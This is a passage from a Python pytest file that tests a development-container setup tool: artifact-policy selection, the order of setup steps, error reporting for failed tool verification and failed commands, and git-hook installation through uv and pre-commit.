        raise RuntimeError("development artifact policy failed before acquisition: invalid selection")
    return selection


def _reviewed_selection(artifact_id: str, version: str) -> dict:
    from tools.check_tooling_artifact_policy import select_tooling_artifact

    return select_tooling_artifact(
        REPO_ROOT,
        artifact_id=artifact_id,
        version=version,
        platform_id="linux-x86_64",
        profile_id="public-linux-x86_64",
    )


def test_the_launcher_admits_the_base_image_by_its_closed_installed_identity() -> None:
    from tools.tool_versions import DEVCONTAINER_BASE_IMAGE_VERSION

    document = _reviewed_selection(BASE_IMAGE_ARTIFACT_ID, DEVCONTAINER_BASE_IMAGE_VERSION)
    selection = _launcher_selection(document, version=DEVCONTAINER_BASE_IMAGE_VERSION)
    assert selection.installed_manifest == ()
    assert dict(selection.installed_identity) == document["platform"]["installed_identity"]


def test_the_launcher_never_admits_a_non_image_artifact_by_identity_alone() -> None:
    from tools.tool_versions import GITLEAKS_VERSION

    document = _reviewed_selection("gitleaks", GITLEAKS_VERSION)
    document["platform"].pop("installed_manifest")
    document["platform"]["installed_identity"] = {
        "implementation": "gitleaks",
        "version": GITLEAKS_VERSION,
        "abi": "native",
        "target": "x86_64-unknown-linux-gnu",
    }
    with pytest.raises(RuntimeError, match="failed before acquisition"):
        _launcher_selection(document, version=GITLEAKS_VERSION)


def test_setup_runs_each_step_in_order_and_announces_readiness(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    from tools import devcontainer_setup, tooling_policy_gate

    order: list[str] = []
    monkeypatch.setattr(tooling_policy_gate, "host_platform_id", lambda: "linux-x86_64")
    monkeypatch.setattr(
        devcontainer_setup, "container_host_profile_id", lambda _root, platform: order.append(platform) or "profile"
    )
    monkeypatch.setattr(devcontainer_setup, "prepare_kit", lambda host, kit: order.append(f"kit:{host}:{kit.name}"))
    monkeypatch.setattr(devcontainer_setup, "sync_projects", lambda _root, _kit: order.append("sync"))
    monkeypatch.setattr(devcontainer_setup, "install_generic_tools", lambda: order.append("tools"))
    monkeypatch.setattr(
        devcontainer_setup, "install_git_hooks", lambda _root, _kit: order.append("hooks") or "installed"
    )
    devcontainer_setup.setup(REPO_ROOT, kit_root=tmp_path / "raes-bootstrap")
    assert order == ["linux-x86_64", "kit:profile:raes-bootstrap", "sync", "tools", "hooks"]
    output = capsys.readouterr().out
    assert output.startswith("RAES development container setup (linux-x86_64)\n")
    assert output.rstrip().endswith("`nox -s verify-changed` before pushing.")


def test_setup_names_the_generic_tools_that_failed_verification(monkeypatch: pytest.MonkeyPatch) -> None:
    from tools import bootstrap_profile, devcontainer_setup

    monkeypatch.setattr(
        bootstrap_profile,
        "qualify_generic_tools",
        lambda: {
            "outcome": "failed",
            "results": [
                {"capability_id": "vale", "outcome": "failed"},
                {"capability_id": "conftest", "outcome": "passed"},
            ],
        },
    )
    with pytest.raises(devcontainer_setup.DevcontainerSetupError, match="failed verification: vale$"):
        devcontainer_setup.install_generic_tools()


def test_a_failing_setup_command_stops_setup_with_its_exit_code(tmp_path: Path) -> None:
    from tools.devcontainer_setup import DevcontainerSetupError, _run

    with pytest.raises(DevcontainerSetupError, match="exit code 3"):
        _run(["/bin/sh", "-c", "exit 3"], tmp_path, {"PATH": "/usr/bin:/bin"})
    with pytest.raises(DevcontainerSetupError, match="could not run"):
        _run([str(tmp_path / "missing-client")], tmp_path, {"PATH": "/usr/bin:/bin"})


def test_setup_installs_hooks_through_the_locked_tool_environment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import subprocess

    from tools import devcontainer_setup

    checkout = tmp_path / "checkout"
    subprocess.run(["git", "init", "-q", str(checkout)], check=True)
    calls: list[list[str]] = []
    monkeypatch.setattr(devcontainer_setup, "_run", lambda argv, _root, _env: calls.append(list(argv)))
    kit = tmp_path / "raes-bootstrap"
    assert devcontainer_setup.install_git_hooks(checkout, kit) == "installed"
    assert calls == [
        [
            str(kit / "bin" / "uv"),
            "run",
            "--project",
            "implementations/tooling/python",
            "--frozen",
            "--no-default-groups",
            "pre-commit",
            "install",
        ]
    ]
